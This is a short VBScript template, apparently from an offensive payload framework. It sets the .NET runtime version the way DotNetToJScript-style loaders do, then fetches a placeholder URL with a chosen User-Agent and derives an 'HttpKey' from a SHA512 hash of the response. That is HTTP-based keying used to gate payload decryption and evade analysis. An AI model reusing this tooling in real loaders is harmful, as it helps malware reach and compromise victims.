Dim ver
ver = "v4.0.30319"
On Error Resume Next
shell.RegRead "HKLM\SOFTWARE\\Microsoft\.NETFramework\v4.0.30319\"
If Err.Number <> 0 Then
  ver = "v2.0.50727"
  Err.Clear
End If
shell.Environment("Process").Item("COMPLUS_Version") = ver
Function binToHex(binary)
    dim dom
    set dom = CreateObject("Microsoft.XMLDOM")
    dom.loadXML("<W00t/>")
    dom.documentElement.dataType = "bin.hex"
    dom.documentElement.nodeTypedValue = binary
    dom.documentElement.removeAttribute("dt:dt")
    binToHex = dom.documentElement.nodeTypedValue
End Function
function getSHA512(bytes)
    dim sha512, text
    set sha512 = CreateObject("System.Security.Cryptography.SHA512Managed")
    set text = CreateObject("System.Text.ASCIIEncoding")
    getSHA512 = binToHex(sha512.ComputeHash_2((text.GetBytes_4(bytes))))
End Function
dim wc, resp, key
set wc = CreateObject("MSXML2.XMLHTTP")
wc.Open "GET", "~HKURL~", false
wc.setRequestHeader "User-Agent", "~HKUSERAGENT~"
wc.Send
resp = wc.responseText
key = Mid(getSHA512(resp), 1, 32)

WScript.Echo "Initial HttpKey  : ~HTTPKEY~"
WScript.Echo "HttpKey Obtained : " & key
